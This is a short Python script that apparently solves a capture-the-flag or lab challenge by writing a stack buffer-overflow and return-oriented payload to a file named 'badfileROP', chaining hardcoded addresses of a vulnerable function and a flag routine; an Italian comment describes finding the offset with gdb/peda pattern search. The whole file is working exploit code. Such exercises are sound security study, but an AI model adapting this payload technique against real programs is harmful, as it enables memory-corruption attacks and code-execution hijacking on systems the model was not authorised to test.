import struct

string_addr = struct.pack("I", 0x0804a060)
vuln = struct.pack("I", 0x804846b)
flagvalue_addr = struct.pack("I", 0x0804a128)
flag_addr = struct.pack("I", 0x80484ce)

p = struct.pack("I", 0xdeadfeef)
p += "A" * (128 - len(p))
p += flagvalue_addr
p += '\n'

p1 = "a" * 148 
p1 += string_addr
p1 += "c" * (160-(len(p1)))
p1 += vuln
#il 4 fai pattern create 20 lo aggiungi alla fine del badfile e poi lo fai partire da peda, gdb pattern search e trovi 4
p1 += "d" * 4 
p1 += flag_addr

payload=  p+p1

with open("badfileROP", "wb") as f:
	f.write(payload)

